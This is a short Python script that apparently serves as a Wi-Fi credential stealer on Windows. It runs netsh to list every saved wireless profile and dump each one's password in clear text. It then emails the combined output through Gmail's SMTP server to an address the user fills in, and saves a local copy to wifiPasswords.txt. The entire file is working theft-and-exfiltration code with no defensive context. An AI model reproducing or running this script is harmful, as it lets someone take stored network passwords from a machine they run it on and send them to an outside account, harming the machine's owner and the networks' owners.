import subprocess
import smtplib
import re

# Get Wi-Fi network profiles
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks = networks.decode('utf-8')  # Decode the bytes-like object to string
networkList = re.findall('(?:profile\s*:\s)(.*)', networks)

# Retrieve Wi-Fi passwords
finalOutput = ""
for network in networkList:
    showKey = f"netsh wlan show profile {network} key=clear"
    oneNetworkResult = subprocess.check_output(showKey, shell=True)
    oneNetworkResult = oneNetworkResult.decode('utf-8')  # Decode the bytes-like object to string
    finalOutput += oneNetworkResult

# Send output as an email
email = "your_email@gmail.com"  # Replace with your email address
password = "your_password"  # Replace with your email password

server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(email, password)
server.sendmail(email, email, finalOutput)
server.quit()

# Save output to a file
with open("wifiPasswords.txt", "w") as file:
    file.write(finalOutput)